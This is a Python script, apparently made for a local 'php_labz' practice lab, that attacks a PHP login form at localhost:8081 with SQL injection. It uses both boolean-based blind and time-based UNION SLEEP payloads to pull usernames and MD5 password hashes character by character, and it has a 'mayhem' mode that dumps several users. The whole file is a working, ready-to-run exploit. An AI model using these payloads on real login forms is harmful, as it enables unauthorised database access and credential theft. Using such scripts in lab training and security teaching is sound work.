#!/usr/bin/python3
from argparse import ArgumentParser, BooleanOptionalAction
from bs4 import BeautifulSoup
import requests as rq
import time
import sys

def classic_option(userid):
    print(f"[+] Attacking userid {userid} user with classic type of SQL Injection.")
    print(f"Username: ", end="")
    for username_len in range(1, 10):
        for printable_char in range(32, 126):
            payload = {
                "uname": f"something') OR (ASCII(substring(username,{username_len},1))={printable_char} AND id={userid})-- ",
                "pw": ''
            }
            injection_request = rq.post("http://localhost:8081/injection.php", data=payload)
            soup = BeautifulSoup(injection_request.text, "html.parser")
            if(soup.find_all(string="Invalid creds.")):
                continue
            sys.stdout.write(chr(printable_char))
            sys.stdout.flush()
    sys.stdout.write("\n")

    print(f"Password: ", end="")
    for md5_len in range(1,33):
        for printable_char in range(32, 126):
            payload = {
                "uname": f"something') OR (ASCII(substring(password,{md5_len},1))={printable_char} AND id={userid})-- ",
                "pw": ''
            }
            injection_request = rq.post("http://localhost:8081/injection.php", data=payload)
            soup = BeautifulSoup(injection_request.text, "html.parser")
            if(soup.find_all(string="Invalid creds.")):
                continue
            sys.stdout.write(chr(printable_char))
            sys.stdout.flush()
    sys.stdout.write("\n")
    print(f"========================================================")

def union_option(userid):
    print(f"[+] Attacking userid {userid} user with union time-based type of SQL Injection.")
    print(f"Username: ", end="")
    for username_len in range(1, 10):
        for printable_char in range(32, 126):
            payload = {
                "uname": f"something') UNION SELECT null,null,IF(ASCII(substring(username,{username_len},1))={printable_char},SLEEP(2),0) from users where id={userid}-- ",
                "pw": ''
            }
            start_time = time.perf_counter()
            rq.post("http://localhost:8081/injection.php", data=payload)
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time > 2:
                sys.stdout.write(chr(printable_char))
                sys.stdout.flush()     
    sys.stdout.write("\n")

    print(f"Password: ", end="")
    for md5_len in range(1, 33):
        for printable_char in range(32, 126):
            payload = {
                "uname": f"something') UNION SELECT null,null,IF(ASCII(substring(password,{md5_len},1))={printable_char},SLEEP(2),0) from users where id={userid}-- ",
                "pw": ''
            }
            start_time = time.perf_counter()
            rq.post("http://localhost:8081/injection.php", data=payload)
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time > 2:
                sys.stdout.write(chr(printable_char))
                sys.stdout.flush()     
    sys.stdout.write("\n")
    print(f"========================================================")

if __name__ == "__main__":
    argparse = ArgumentParser(prog="SQL Injector php_labz lab.")
    argparse.add_argument("-tb", "--timebased", metavar="timebased", action=BooleanOptionalAction, type=bool, help="Time-based union SQL injection.")
    argparse.add_argument("-cl", "--classic", metavar="classic", action=BooleanOptionalAction, type=bool, help="Classic SQL injection.")
    argparse.add_argument("-mh", "--mayhem", metavar="mayhem", action=BooleanOptionalAction, type=bool, help="Full dump.")
    argparse.add_argument("-uid", "--userid", metavar="userid", type=int, help="Which user to dump?")
    arguments = argparse.parse_args()
    print(arguments)

    if (arguments.classic and arguments.userid):
        classic_option(arguments.userid)
    elif (arguments.timebased and arguments.userid):
        union_option(arguments.userid) 
    elif (arguments.classic and arguments.mayhem):
        for userid in range(1, 6):
            classic_option(userid)
    elif (arguments.timebased and arguments.mayhem):
        for userid in range(1, 6):
            union_option(userid)